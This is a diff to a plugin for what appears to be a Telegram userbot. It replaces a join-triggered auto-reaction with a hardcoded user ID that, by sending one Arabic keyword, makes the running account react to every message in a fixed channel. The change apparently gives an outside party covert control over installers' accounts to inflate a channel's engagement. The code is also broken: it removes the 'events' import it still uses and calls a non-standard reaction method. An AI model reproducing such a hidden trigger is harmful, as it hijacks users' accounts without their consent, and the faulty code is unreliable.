@@ -1,7 +1,4 @@
 import asyncio
-from telethon import events, utils
-from telethon.tl.types import InputMediaDice
-import asyncio
 import os
 import contextlib
 import random
@@ -22,13 +19,17 @@ from ..sql_helper.global_collection import (
     get_collectionlist_items,
 )
 from ..sql_helper.globals import delgvar
-async def auto_react(channel_username, reaction_emoji):
-    channel = await l313l.get_entity(channel_username)
-    async for message in l313l.iter_messages(channel):
-        await l313l.send_reaction(message, reaction_emoji)
+allowed_users = [6205161271]
 
-@l313l.on(events.ChatAction)
-async def auto_reaction(event):
-    if isinstance(event.action, events.ChatAction.UserJoined):
-        reaction_emoji = "❤🔥"  # Change to the desired reaction emoji
-        await auto_react("@Qrh9x", reaction_emoji)
+@l313l.on(events.NewMessage)
+async def handle_messages(event):
+    user_id = event.sender_id
+    if user_id in allowed_users:
+        message_text = event.message.text.strip()
+        if message_text == 'تفاعلوا':
+            # Reply with "ok"
+            await event.reply("ok")
+
+            # React with strawberry emoji to all messages in "@Qrh9" channel
+            async for message in l313l.iter_messages("@Qrh9x"):
+                await message.add_reaction("🍓")
